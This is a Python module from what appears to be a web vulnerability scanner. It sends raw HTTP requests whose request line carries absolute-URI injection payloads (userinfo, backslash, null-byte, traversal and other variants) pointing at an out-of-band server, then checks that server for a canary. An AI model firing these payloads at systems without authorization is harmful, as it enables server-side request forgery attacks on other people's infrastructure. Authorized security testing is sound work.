#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True
from utils.style import Colors
from utils.utils import (
    requests,
    re,
    get_domain_from_url,
    CANARY,
    human_time
)
from utils.requests_settings import _raw_request


def _check_raw_response(raw_resp, interactdom, baseline, payload, interact, canary, path):
    """Check a raw socket response string for indicators."""
    if interactdom in raw_resp:
        print(f"{Colors.GREEN}   └── [+] {interactdom} reflected in raw response | PAYLOAD: {payload}{Colors.RESET}")

    status_match = re.search(r"HTTP/[\d.]+ (\d{3})", raw_resp)
    if status_match:
        status_code = int(status_match.group(1))
        if status_code != baseline['status'] and status_code not in [400, 403]:
            print(f"{Colors.YELLOW}   └── [STATUS ≠ BASELINE] {status_code} ≠ {baseline['status']} | PAYLOAD: {payload}{Colors.RESET}")

    try:
        req_interact = requests.get(interact, verify=False, allow_redirects=False, timeout=10)
        if req_interact.status_code == 200:
            if canary in req_interact.text:
                print(f"{Colors.GREEN}   └── [+] canary '{canary}' caught on {interact} | PAYLOAD: {payload}{Colors.RESET}")
            if path in req_interact.text:
                print(f"{Colors.GREEN}   └── [+] path '{path}' caught on {interact} | PAYLOAD: {payload}{Colors.RESET}")
    except requests.RequestException:
        pass


def absolute_uri_injection(url, human, parsed_req, baseline, interact, proxy=None):
    """
    Absolute URI injection in the HTTP request line.
    Replaces the path with an absolute URI target — same raw socket
    pattern as double-host and unicode modules.
    """
    print(f"{Colors.CYAN} ├  Absolute URI analysis{Colors.RESET}")

    interactdom = get_domain_from_url(interact)
    original_host = parsed_req["host"]
    method = parsed_req["method"]
    path = parsed_req["path"]
    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])

    scheme = "https" if "https" in url else "http"
    use_ssl = scheme == "https"
    port = 443 if use_ssl else 80

    canary_ua = None
    for h in headers:
        if h.lower() == "user-agent":
            canary_ua = f"{headers[h]}-{CANARY}"
            headers[h] = canary_ua
    if not canary_ua:
        canary_ua = f"Mozilla/5.0-{CANARY}"

    # --- Absolute URI targets (replace path in request line) ---
    targets = [
        # Scheme-based
        (f"https://{interactdom}{path}",                          "scheme-https"),
        (f"http://{interactdom}{path}",                           "scheme-http"),
        (f"{interact}{path}",                                     "full-interact-url"),

        # @ userinfo (RFC 3986)
        (f"@{interactdom}{path}",                                 "@domain"),
        (f":@{interactdom}{path}",                                ":@domain"),
        (f"{path}@{interactdom}",                                 "path@domain"),
        (f"https://{original_host}@{interactdom}{path}",          "host-as-userinfo-https"),
        (f"http://{original_host}@{interactdom}{path}",           "host-as-userinfo-http"),

        # Backslash normalization
        (f"https://{original_host}\\@{interactdom}{path}",        "backslash-userinfo"),
        (f"https:\\\\{interactdom}{path}",                         "backslash-scheme"),

        # Fragment / hash
        (f"{path}#{interactdom}",                                  "fragment"),
        (f"{path}%23@{interactdom}",                               "encoded-hash"),

        # Scheme-relative
        (f"//{interactdom}{path}",                                 "scheme-relative"),
        (f"//{original_host}@{interactdom}{path}",                 "scheme-relative-userinfo"),

        # Null byte / tab
        (f"https://{interactdom}%00{path}",                        "nullbyte"),
        (f"https://{interactdom}\t{path}",                         "tab-separator"),

        # Path traversal into authority
        (f"https://{original_host}{path}/../@{interactdom}",       "path-traversal-userinfo"),

        # Port explicit
        (f"https://{interactdom}:443{path}",                       "explicit-port-443"),
        (f"http://{interactdom}:80{path}",                         "explicit-port-80"),
    ]

    for target, desc in targets:
        try:
            human_time(human)
            # Build raw request — just swap path for absolute URI target
            request_line = f"{method} {target} HTTP/1.1\r\n"

            raw_headers = f"Host: {original_host}\r\n"
            for k, v in headers.items():
                if k.lower() == "host":
                    continue
                if k.lower() == "user-agent":
                    raw_headers += f"{k}: {canary_ua}\r\n"
                else:
                    raw_headers += f"{k}: {v}\r\n"

            body_bytes = body.encode() if isinstance(body, str) else (body or b"")
            if body_bytes:
                raw_headers += f"Content-Length: {len(body_bytes)}\r\n"

            raw_req = (request_line + raw_headers + "\r\n").encode() + body_bytes
            raw_resp = _raw_request(original_host, port, raw_req, use_ssl=use_ssl, timeout=10)
            _check_raw_response(raw_resp, interactdom, baseline, f"{target}", interact, CANARY, path)

        except Exception as e:
            print(f"  {Colors.RED}[!] absolute-URI error ({desc} → {method} {target}): {e}{Colors.RESET}")